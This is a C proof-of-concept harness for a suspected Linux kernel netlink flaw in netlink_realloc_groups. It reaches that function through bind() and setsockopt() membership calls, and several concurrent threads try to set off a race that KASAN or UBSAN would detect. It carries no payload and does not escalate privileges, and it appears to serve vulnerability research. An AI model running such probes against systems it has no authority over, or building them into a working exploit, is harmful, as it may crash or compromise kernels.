/*
 * PoC for WMI-3: netlink_realloc_groups
 *
 * Trigger netlink_realloc_groups via both bind() and setsockopt()
 * paths, and attempt concurrent access to detect any KASAN/UBSAN
 * issues in the reallocation path.
 *
 * The vulnerable function is at af_netlink.c:980 in netlink_realloc_groups()
 * where krealloc preserves existing (potentially attacker-determined) group
 * data and memset zeroes only the newly allocated portion.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <errno.h>
#include <pthread.h>

#define NL_MAX_GROUPS 32

struct thread_arg {
    int sock;
    int group;
    int iterations;
};

/* Thread that repeatedly adds memberships, triggering netlink_realloc_groups */
static void *add_membership_thread(void *arg)
{
    struct thread_arg *ta = (struct thread_arg *)arg;
    int val = ta->group;
    int ret;

    for (int i = 0; i < ta->iterations; i++) {
        ret = setsockopt(ta->sock, SOL_NETLINK,
                         NETLINK_ADD_MEMBERSHIP, &val, sizeof(val));
        if (ret < 0 && errno != EINVAL && errno != EPERM) {
            /* EINVAL when ngroups exceeded - expected */
            break;
        }
        val++;
        if (val > NL_MAX_GROUPS)
            val = 1;
    }
    return NULL;
}

/* Thread that reads memberships while reallocs happen */
static void *list_memberships_thread(void *arg)
{
    struct thread_arg *ta = (struct thread_arg *)arg;
    uint32_t buf[256];
    socklen_t len;
    int ret;

    for (int i = 0; i < ta->iterations; i++) {
        len = sizeof(buf);
        memset(buf, 0, sizeof(buf));
        ret = getsockopt(ta->sock, SOL_NETLINK,
                         NETLINK_LIST_MEMBERSHIPS, buf, &len);
        (void)ret; /* EFAULT expected for short buffers, ignore */
    }
    return NULL;
}

/* Thread that does bind with groups (unused in current tests) */
#if 0
static void *bind_thread(void *arg)
{
    struct thread_arg *ta = (struct thread_arg *)arg;
    struct sockaddr_nl addr;
    int ret;

    for (int i = 0; i < ta->iterations; i++) {
        memset(&addr, 0, sizeof(addr));
        addr.nl_family = AF_NETLINK;
        addr.nl_groups = ta->group;
        ret = bind(ta->sock, (struct sockaddr *)&addr, sizeof(addr));
        /* EBUSY expected after first bind - OK */
        (void)ret;
    }
    return NULL;
}
#endif

static int test_bind_path(void)
{
    int sock, ret;
    struct sockaddr_nl addr;
    uint32_t buf[256];
    socklen_t len;

    printf("[*] === bind() path ===\n");
    sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_USERSOCK);
    if (sock < 0) {
        perror("[-] socket");
        return -1;
    }

    printf("[*] bind with nl_groups=0x55 (groups 0,2,4,6)\n");
    memset(&addr, 0, sizeof(addr));
    addr.nl_family = AF_NETLINK;
    addr.nl_groups = 0x55;
    ret = bind(sock, (struct sockaddr *)&addr, sizeof(addr));
    printf("[*] bind returned %d (errno=%d: %s)\n",
           ret, errno, strerror(errno));

    /* Read memberships back */
    len = sizeof(buf);
    ret = getsockopt(sock, SOL_NETLINK, NETLINK_LIST_MEMBERSHIPS, buf, &len);
    if (ret == 0) {
        printf("[*] Memberships after bind (%d bytes): ", len);
        for (int i = 0; i < (int)(len / sizeof(uint32_t)); i++)
            printf("%08x ", buf[i]);
        printf("\n");
    }

    close(sock);
    return 0;
}

static int test_setsockopt_path(void)
{
    int sock, ret;
    uint32_t buf[256];
    socklen_t len;

    printf("\n[*] === setsockopt(NETLINK_ADD_MEMBERSHIP) path ===\n");
    sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_USERSOCK);
    if (sock < 0) {
        perror("[-] socket");
        return -1;
    }

    /* Add several memberships one at a time */
    for (int g = 1; g <= 5; g++) {
        ret = setsockopt(sock, SOL_NETLINK,
                         NETLINK_ADD_MEMBERSHIP, &g, sizeof(g));
        printf("[*] ADD_MEMBERSHIP group %d: %d (errno=%d: %s)\n",
               g, ret, errno, strerror(errno));
    }

    /* Read back */
    len = sizeof(buf);
    ret = getsockopt(sock, SOL_NETLINK, NETLINK_LIST_MEMBERSHIPS, buf, &len);
    if (ret == 0) {
        printf("[*] Memberships after ADD_MEMBERSHIP (%d bytes): ", len);
        for (int i = 0; i < (int)(len / sizeof(uint32_t)); i++)
            printf("%08x ", buf[i]);
        printf("\n");
    }

    close(sock);
    return 0;
}

static int test_race_path(void)
{
    int sock, ret;
    pthread_t t1, t2, t3, t4, t5;
    struct thread_arg ta1, ta2, ta3, ta4, ta5;
    uint32_t buf[256];
    socklen_t len;

    printf("\n[*] === Concurrent access path ===\n");
    sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_USERSOCK);
    if (sock < 0) {
        perror("[-] socket");
        return -1;
    }

    /* First trigger netlink_realloc_groups to allocate the groups buffer */
    int val = 1;
    ret = setsockopt(sock, SOL_NETLINK,
                     NETLINK_ADD_MEMBERSHIP, &val, sizeof(val));
    printf("[*] Initial ADD_MEMBERSHIP before race: %d (errno=%d)\n",
           ret, errno);

    /* Spawn concurrent threads */
    int n_iter = 1000;
    ta1.sock = sock; ta1.group = 2; ta1.iterations = n_iter;
    ta2.sock = sock; ta2.group = 4; ta2.iterations = n_iter;
    ta3.sock = sock; ta3.group = 6; ta3.iterations = n_iter;
    ta4.sock = sock; ta4.group = 8; ta4.iterations = n_iter;
    ta5.sock = sock; ta5.group = 0; ta5.iterations = n_iter;

    pthread_create(&t1, NULL, add_membership_thread, &ta1);
    pthread_create(&t2, NULL, add_membership_thread, &ta2);
    pthread_create(&t3, NULL, add_membership_thread, &ta3);
    pthread_create(&t4, NULL, list_memberships_thread, &ta4);
    pthread_create(&t5, NULL, list_memberships_thread, &ta5);

    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
    pthread_join(t3, NULL);
    pthread_join(t4, NULL);
    pthread_join(t5, NULL);

    printf("[*] Concurrent access completed\n");

    /* Read final memberships */
    len = sizeof(buf);
    ret = getsockopt(sock, SOL_NETLINK, NETLINK_LIST_MEMBERSHIPS, buf, &len);
    if (ret == 0) {
        printf("[*] Memberships after race (%d bytes): ", len);
        for (int i = 0; i < (int)(len / sizeof(uint32_t)); i++)
            printf("%08x ", buf[i]);
        printf("\n");
    }

    close(sock);
    return 0;
}

static int test_ngroups_expansion(void)
{
    /*
     * NETLINK_ROUTE has RTNLGRP_MAX groups (typically > 32).
     * First bind with groups to trigger the initial alloc,
     * then repeatedly add groups to exercise ngroups.
     */
    int sock, ret;
    int val;
    struct sockaddr_nl addr;
    uint32_t buf[256];
    socklen_t len;

    printf("\n[*] === NETLINK_ROUTE (larger groups) path ===\n");
    sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (sock < 0) {
        perror("[-] socket(NETLINK_ROUTE)");
        return -1;
    }

    /* Trigger netlink_realloc_groups via bind */
    memset(&addr, 0, sizeof(addr));
    addr.nl_family = AF_NETLINK;
    addr.nl_groups = 1;
    ret = bind(sock, (struct sockaddr *)&addr, sizeof(addr));
    printf("[*] bind(NETLINK_ROUTE, groups=1): %d (errno=%d)\n",
           ret, errno);

    /* Add a high group number to test larger ngroups */
    for (int g = 1; g <= 5; g++) {
        val = g;
        ret = setsockopt(sock, SOL_NETLINK,
                         NETLINK_ADD_MEMBERSHIP, &val, sizeof(val));
        if (ret < 0 && errno != EINVAL)
            printf("[*] ADD_MEMBERSHIP(NETLINK_ROUTE, group=%d): %d (errno=%d)\n",
                   g, ret, errno);
    }

    /* Read back */
    len = sizeof(buf);
    ret = getsockopt(sock, SOL_NETLINK, NETLINK_LIST_MEMBERSHIPS, buf, &len);
    if (ret == 0) {
        printf("[*] Memberships (%d bytes): ", len);
        for (int i = 0; i < (int)(len / sizeof(uint32_t)); i++)
            printf("%08x ", buf[i]);
        printf("\n");
    }

    close(sock);
    return 0;
}

int main(void)
{
    printf("[*] WMI-3 PoC: netlink_realloc_groups (af_netlink.c:980)\n\n");

    test_bind_path();
    test_setsockopt_path();
    test_race_path();
    test_ngroups_expansion();

    printf("\n[*] All tests completed\n");
    return 0;
}
